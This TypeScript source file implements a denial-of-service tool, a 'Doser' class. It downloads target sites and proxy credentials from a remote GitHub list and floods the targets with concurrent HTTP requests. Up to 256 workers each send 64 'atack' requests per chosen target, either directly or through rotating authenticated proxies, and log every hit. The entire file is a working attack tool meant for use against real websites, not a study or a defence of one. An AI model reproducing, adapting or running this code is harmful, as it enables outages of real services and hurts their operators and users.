import { readFile } from "fs/promises";
import axios, { AxiosError } from "axios-https-proxy-fix";
import { EventEmitter } from "events";

const sitesFile = process.env.SITE_FILE;
const proxiesFile = process.env.PROXY_FILE;

const readData = async <T>(path: string): Promise<T> => {
  const data = await readFile(path, { encoding: "utf8" });

  return JSON.parse(data) as T;
};

const getSites = async (): Promise<Array<SiteData>> => {
  if (sitesFile) {
    return readData(sitesFile);
  }

  return axios
    .get<Array<SiteData>>(
      "https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json",
      { timeout: 10000 }
    )
    .then(({ data }) => data);
};

const getProxies = async (): Promise<Array<ProxyData>> => {
  if (proxiesFile) {
    return readData(proxiesFile);
  }

  return axios
    .get<Array<ProxyData>>(
      "https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json",
      { timeout: 10000 }
    )
    .then(({ data }) => data);
};

interface ProxyData {
  auth: string;
  id: number;
  ip: string;
}

interface SiteData {
  atack: number;
  id: number;
  // eslint-disable-next-line camelcase
  need_parse_url: number;
  page: string;
  // eslint-disable-next-line camelcase
  page_time: number;
  url: string;
}

interface TargetData {
  site: SiteData;
  proxy: Array<ProxyData>;
}

export type DoserEventType = "atack" | "error";

export class Doser {
  private onlyProxy: boolean;
  private hosts: Array<string> = [];
  private working: boolean;
  private workers: number;
  private eventSource: EventEmitter;

  private workerActive: Array<boolean>;

  constructor(onlyProxy: boolean, workers: number) {
    this.onlyProxy = onlyProxy;
    this.working = false;
    this.workers = workers;
    this.eventSource = new EventEmitter();
    this.workerActive = new Array<boolean>(256);
    this.workerActive.fill(false);
  }

  forceProxy(newVal: boolean) {
    this.onlyProxy = newVal;
  }

  async loadHostsFile() {
    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
    // this.hosts = response.data as Array<string>
  }

  async getSitesAndProxyes() {
    while (this.working) {
      // escaping unavailable hosts
      try {
        const sites = await getSites();
        const proxyes = await getProxies();

        return {
          sites,
          proxyes,
        };
      } catch (e) {
        console.log("Error while loading hosts");
        console.log(e);
      }
    }
    return null;
  }

  async getRandomTarget() {
    while (this.working) {
      // escaping unavailable hosts
      try {
        const sites = await getSites();
        const proxyes = await getProxies();

        return {
          site: sites[Math.floor(Math.random() * sites.length)],
          proxy: proxyes,
        } as TargetData;
      } catch (e) {
        console.log("Error while loading hosts");
        console.log(e);
      }
    }
    return null;
  }

  start() {
    this.working = true;
    this.setWorkersCount(this.workers);
    for (let i = 0; i < 256; i++) {
      const setI = i;
      setImmediate(() => void this.worker.bind(this)(setI));
    }
  }

  setWorkersCount(newCount: number) {
    this.workers = newCount;
    for (let wIndex = 0; wIndex < 256; wIndex++) {
      this.workerActive[wIndex] = wIndex < newCount;
    }
  }

  stop() {
    this.working = false;
  }

  listen(event: DoserEventType, callback: (data: any) => void) {
    this.eventSource.addListener(event, callback);
  }

  private async worker(workerIndex: number) {
    let config = await this.getSitesAndProxyes();
    let configTimestamp = new Date();
    while (this.working) {
      if (!this.workerActive[workerIndex]) {
        await new Promise((resolve) => setTimeout(resolve, 10000));
        continue;
      }

      if (new Date().getTime() - configTimestamp.getTime() > 300000) {
        config = await this.getSitesAndProxyes();
        configTimestamp = new Date();
      }

      if (config == null) {
        break;
      }

      const target = {
        site: config.sites[Math.floor(Math.random() * config.sites.length)],
        proxy: config.proxyes,
      } as TargetData;

      // check if direct request can be performed
      let directRequest = false;
      if (!this.onlyProxy) {
        try {
          const response = await axios.get(target.site.page, {
            timeout: 10000,
          });
          directRequest = response.status === 200;
        } catch (e) {
          this.eventSource.emit("error", { type: "error", error: e });
          directRequest = false;
        }
      }

      const ATACKS_PER_TARGET = 64;

      let proxy = null;
      for (
        let atackIndex = 0;
        atackIndex < ATACKS_PER_TARGET && this.working;
        atackIndex++
      ) {
        try {
          if (directRequest) {
            const r = await axios.get(target.site.page, {
              timeout: 5000,
              validateStatus: () => true,
            });
            this.eventSource.emit("atack", {
              type: "atack",
              url: target.site.page,
              log: `${target.site.page} | DIRECT | ${r.status}`,
            });
          } else {
            if (proxy === null) {
              proxy =
                target.proxy[Math.floor(Math.random() * target.proxy.length)];
            }
            const proxyAddressSplit = proxy.ip.split(":");
            const proxyIP = proxyAddressSplit[0];
            const proxyPort = parseInt(proxyAddressSplit[1]);
            const proxyAuthSplit = proxy.auth.split(":");
            const proxyUsername = proxyAuthSplit[0];
            const proxyPassword = proxyAuthSplit[1];

            const r = await axios.get(target.site.page, {
              timeout: 10000,
              validateStatus: () => true,
              proxy: {
                host: proxyIP,
                port: proxyPort,
                auth: {
                  username: proxyUsername,
                  password: proxyPassword,
                },
              },
            });

            this.eventSource.emit("atack", {
              type: "atack",
              url: target.site.page,
              log: `${target.site.page} | PROXY | ${r.status}`,
            });

            if (r.status === 407) {
              console.log(proxy);
              proxy = null;
            }
          }
        } catch (e) {
          console.log(e);
          proxy = null;
          let code = (e as AxiosError).code;
          if (code === undefined) {
            console.log(e);
            code = "UNKNOWN";
          }
          this.eventSource.emit("atack", {
            type: "atack",
            url: target.site.page,
            log: `${target.site.page} | ${code}`,
          });
          if (code === "ECONNABORTED") {
            break;
          }
        }
      }
    }
  }
}
